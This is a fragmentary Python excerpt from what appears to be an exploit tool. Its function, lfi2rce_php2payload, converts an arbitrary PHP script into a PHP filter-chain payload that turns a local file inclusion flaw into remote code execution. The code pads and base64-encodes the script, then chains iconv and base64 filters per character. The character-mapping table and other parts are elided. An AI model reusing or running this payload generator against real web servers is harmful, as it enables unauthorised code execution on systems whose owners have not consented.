...
def lfi2rce_php2payload(php_script: str, resource: str):
    """
    - input : `php_script (str)`, `resource (str)`
    - output : `payload (str)` , PHP filter chain of `php_script`
    """
    ...
    if len(php_script) % 3 != 0:
        php_script += ' ' * (3 - (len(php_script) % 3))

    php_script = base64.b64encode(php_script.encode()).decode()
    for char in reversed(php_script):
        filters += char2filter[char] + ['convert.base64-decode', 'convert.base64-encode', 'convert.iconv.UTF8.UTF7']
